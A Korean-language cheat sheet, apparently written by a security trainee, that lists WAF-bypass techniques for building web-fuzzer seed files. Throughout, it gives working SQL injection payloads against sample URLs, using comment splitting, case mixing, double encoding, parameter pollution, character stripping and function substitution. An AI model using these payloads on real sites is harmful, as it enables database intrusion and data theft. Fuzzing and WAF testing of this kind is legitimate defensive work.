# Web Fuzzer WAF 우회 기법 분석

**작성자: BoB 보안제품개발 9기 한승훈**

본 문서는 Web Fuzzer 제작시 시드파일에서 활용가능한 WAF우회기법들을 정리한 문서임.

해당 문서를 기반으로 WAF를 우회하기 위한 다양한 시드파일 제작이 필요함.



## 일반 우회 & 공격기법

일반적으로 대부분의 서버 및 WAF 환경에서 사용 가능한 공격 우회 기법에 대해 기술하였다.



### 1. 주석 처리 기법

: 중간 공격 키워드 가운데 주석을 삼입함으로써 WAF우회

```
http://victim.com/news.php?id=1+un/**/ion+se/**/lect+1,2,3.....

http://victim.com/news.php?id=1+/*!union*/ /*!select*/ 1,2,3,4….
```



### 2. 대소문자 교체 기법

: 방화벽 필터설정이 다음과 같을 때 /union\select/g 공격 키워드의 대소문자를 변경하여 WAF우회

```
http://victim.com/news.php?id=1+UnIoN/**/SeLecT/**/1,2,3...
```



### 3. 키워드 대체 기법

: 웹방화벽의 ``union``, ``select`` 차단을 역이용하여 공격 키워드 WAF우회

```
http://victim.com/news.php?id=1+UNunionION+SEselectLECT+1,2,3--
```



### 4. 문자 인코딩 기법

: 공격 키워드가 포함된 명령을 인코딩 후 WAF이후에 디코딩하여 WAF우회

```
http://victim.com/news.php id=1%252f%252a*/union%252f%252a/select%252f%252a*/1,2,3%252f%252a*/from%252f%252a*/users--
http://victim.com/news.php?id=1/**/union/*/select/**/1,2,3/**/from/**/users--
```



### 5. BOF 공격 기법

: 서버의 BOF 유도를 통해 서비스를 공격

```
http://victim.com/news.php?id=1+and+(select 1)=(select 0x414141414141441414141414114141414141414141414141414141414141414141.)+union+select+1,2,version(),database(),user(),6,7,8,9,10--
```



## 고급 우회 & 공격 기법

특정 서버 및 WAF 환경에서 사용가능한 복잡한 공격기법에 대해 서술하였다.



### 1. HTTP 파라미터 분할 및 병합 우회 기법

: 특정 웹서버에서 HTTP 파라미터를 처리하는 방식을 악용에 WAF를 우회하는 방법

| Web Server 종류 |      Parameter 해석기법      |      예시      |
| :-------------: | :--------------------------: | :------------: |
|   ASP.NET/IIS   |    Concatenation by comma    | par1=val1,val2 |
|     ASP/IIS     |    Concatenation by comma    | par1=val1,val2 |
|   PHP/Apache    | The last param is resulting  |   Par1=val2    |
|   JSP/Tomcat    | The first param is resulting |   par1=val1    |
|   Perl/Apache   | The first param is resulting |   par1=val1    |



#### Example) ASP / ASP.NET's 환경에서의 공격 예시

```
http://www.example.com/search.aspx?q=select name&q=password from users 
```

* SQL Injection 공격 시도를 다음과 같이 파라메터 q에 분할하여 전송

* ASP/ASP.NET's 에서는 파라메터 q를 합쳐서 q= select name,password from users 로 인식하게 됨.



### 2. 문자 생략 기법

: 특정 웹서버에서 HTTP 파라미터를 생략하는 로직을 악용에 WAF를 우회하는 방법

* character “%“는 ASP/ASP.NET에서 생략되어 인식됩니다.

* 아래와 같이 정형화된 SQL문을 시도할 경우 방화벽에서 탐지가 되는데, SQL문 중간에 “%” 삽입을 통해 우회가 가능합니다.

```
http://victim.com/news.asp?id=10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)
```



### 3. 필터링 키워드 우회기법

: 특정 웹서버의 필터링 정책의 허점을 활용



#### 3.1 and, or 키워드 우회

* 다음과 같은 SQL 공격 시도시 and, or 을 ||, && 로 대체하여 우회 성공 가능성 높음.

```
Filtered injection: “1 or 1 = 1”, “1 and 1 = 1”
Bypassed injection:  “1 || 1 = 1” “1 && 1 = 1”
```

* 또한 union의 경우도 다음과 같은 우회 방법이 존재함.

```
Filtered injection:	union select user, password from users
Bypassed injection: 1 || (select user from users where user_id = 1) = 'admin'
```



#### 3.2 함수 키워드 우회

SQL Injection 공격에 자주 사용되는 함수를 사용할 경우 WAF에서 쉽게 필터링 함.

이 경우, 자주 사용되는 함수를 비슷한 함수로 변경하여 우회가 가능.

- substring() → mid(), substr(), etc
- ascii() → hex(), bin(), etc
- benchmark() → sleep()

```
Ex)Know:
substring((select 'password'),1,1) = 0x70
substr((select 'password'),1,1) = 0x70 
mid((select 'password'),1,1) = 0x70

New:
strcmp(left('password',1), 0x69) = 1
strcmp(left('password',1), 0x70) = 0
strcmp(left('password',1), 0x71) = -1
```

